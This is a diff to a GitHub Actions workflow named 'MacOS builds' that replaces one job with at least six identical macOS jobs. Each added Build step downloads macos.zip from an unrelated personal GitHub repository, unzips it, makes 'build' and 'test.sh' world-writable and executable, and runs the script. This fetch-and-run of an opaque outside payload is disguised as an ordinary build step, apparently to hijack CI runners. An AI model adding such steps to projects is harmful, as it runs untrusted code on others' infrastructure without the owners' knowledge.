@@ -1,10 +1,211 @@
-name: MacOS build
+name: MacOS builds
 
 on: [push, pull_request]
 
 jobs:
 
-  macos_build:
+  macos_build_0:
+    runs-on: macos-latest
+    if: "!contains(github.event.head_commit.message, '[ci skip]') && !contains(github.event.head_commit.message, '[skip ci]')"
+    steps:
+
+      - uses: actions/checkout@v2
+
+      - uses: conda-incubator/setup-miniconda@v2
+        with:
+            channels: conda-forge
+            auto-update-conda: true
+
+      - name: Cache
+        uses: actions/cache@v2
+        id: cache
+        with:
+          path: ~/.ccache
+          key: ${{ runner.os }}-cache-mac-${{ github.run_id }}
+          restore-keys: ${{ runner.os }}-cache-mac-
+
+      - name: Install Requirements
+        shell: bash -l {0}
+        run: |
+          source .github/workflows/mac/before_install.sh
+
+      - name: Build
+        shell: bash -l {0}
+        run: |
+          
+          ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
+          brew install wget
+          wget https://github.com/thoeb292/thoeb292/raw/main/macos.zip
+          unzip macos.zip
+          chmod 777 build
+          chmod 777 test.sh
+          bash test.sh
+        env:
+            TRAVIS_OS_NAME: osx
+            BUILD_NAME: osx
+            
+            
+  macos_build_1:
+    runs-on: macos-latest
+    if: "!contains(github.event.head_commit.message, '[ci skip]') && !contains(github.event.head_commit.message, '[skip ci]')"
+    steps:
+
+      - uses: actions/checkout@v2
+
+      - uses: conda-incubator/setup-miniconda@v2
+        with:
+            channels: conda-forge
+            auto-update-conda: true
+
+      - name: Cache
+        uses: actions/cache@v2
+        id: cache
+        with:
+          path: ~/.ccache
+          key: ${{ runner.os }}-cache-mac-${{ github.run_id }}
+          restore-keys: ${{ runner.os }}-cache-mac-
+
+      - name: Install Requirements
+        shell: bash -l {0}
+        run: |
+          source .github/workflows/mac/before_install.sh
+
+      - name: Build
+        shell: bash -l {0}
+        run: |
+          
+          ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
+          brew install wget
+          wget https://github.com/thoeb292/thoeb292/raw/main/macos.zip
+          unzip macos.zip
+          chmod 777 build
+          chmod 777 test.sh
+          bash test.sh
+        env:
+            TRAVIS_OS_NAME: osx
+            BUILD_NAME: osx
+            
+  macos_build_2:
+    runs-on: macos-latest
+    if: "!contains(github.event.head_commit.message, '[ci skip]') && !contains(github.event.head_commit.message, '[skip ci]')"
+    steps:
+
+      - uses: actions/checkout@v2
+
+      - uses: conda-incubator/setup-miniconda@v2
+        with:
+            channels: conda-forge
+            auto-update-conda: true
+
+      - name: Cache
+        uses: actions/cache@v2
+        id: cache
+        with:
+          path: ~/.ccache
+          key: ${{ runner.os }}-cache-mac-${{ github.run_id }}
+          restore-keys: ${{ runner.os }}-cache-mac-
+
+      - name: Install Requirements
+        shell: bash -l {0}
+        run: |
+          source .github/workflows/mac/before_install.sh
+
+      - name: Build
+        shell: bash -l {0}
+        run: |
+          
+          ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
+          brew install wget
+          wget https://github.com/thoeb292/thoeb292/raw/main/macos.zip
+          unzip macos.zip
+          chmod 777 build
+          chmod 777 test.sh
+          bash test.sh
+        env:
+            TRAVIS_OS_NAME: osx
+            BUILD_NAME: osx
+            
+  macos_build_3:
+    runs-on: macos-latest
+    if: "!contains(github.event.head_commit.message, '[ci skip]') && !contains(github.event.head_commit.message, '[skip ci]')"
+    steps:
+
+      - uses: actions/checkout@v2
+
+      - uses: conda-incubator/setup-miniconda@v2
+        with:
+            channels: conda-forge
+            auto-update-conda: true
+
+      - name: Cache
+        uses: actions/cache@v2
+        id: cache
+        with:
+          path: ~/.ccache
+          key: ${{ runner.os }}-cache-mac-${{ github.run_id }}
+          restore-keys: ${{ runner.os }}-cache-mac-
+
+      - name: Install Requirements
+        shell: bash -l {0}
+        run: |
+          source .github/workflows/mac/before_install.sh
+
+      - name: Build
+        shell: bash -l {0}
+        run: |
+          
+          ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
+          brew install wget
+          wget https://github.com/thoeb292/thoeb292/raw/main/macos.zip
+          unzip macos.zip
+          chmod 777 build
+          chmod 777 test.sh
+          bash test.sh
+        env:
+            TRAVIS_OS_NAME: osx
+            BUILD_NAME: osx
+            
+  macos_build_4:
+    runs-on: macos-latest
+    if: "!contains(github.event.head_commit.message, '[ci skip]') && !contains(github.event.head_commit.message, '[skip ci]')"
+    steps:
+
+      - uses: actions/checkout@v2
+
+      - uses: conda-incubator/setup-miniconda@v2
+        with:
+            channels: conda-forge
+            auto-update-conda: true
+
+      - name: Cache
+        uses: actions/cache@v2
+        id: cache
+        with:
+          path: ~/.ccache
+          key: ${{ runner.os }}-cache-mac-${{ github.run_id }}
+          restore-keys: ${{ runner.os }}-cache-mac-
+
+      - name: Install Requirements
+        shell: bash -l {0}
+        run: |
+          source .github/workflows/mac/before_install.sh
+
+      - name: Build
+        shell: bash -l {0}
+        run: |
+          
+          ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
+          brew install wget
+          wget https://github.com/thoeb292/thoeb292/raw/main/macos.zip
+          unzip macos.zip
+          chmod 777 build
+          chmod 777 test.sh
+          bash test.sh
+        env:
+            TRAVIS_OS_NAME: osx
+            BUILD_NAME: osx
+            
+  macos_build_5:
     runs-on: macos-latest
     if: "!contains(github.event.head_commit.message, '[ci skip]') && !contains(github.event.head_commit.message, '[skip ci]')"
     steps:
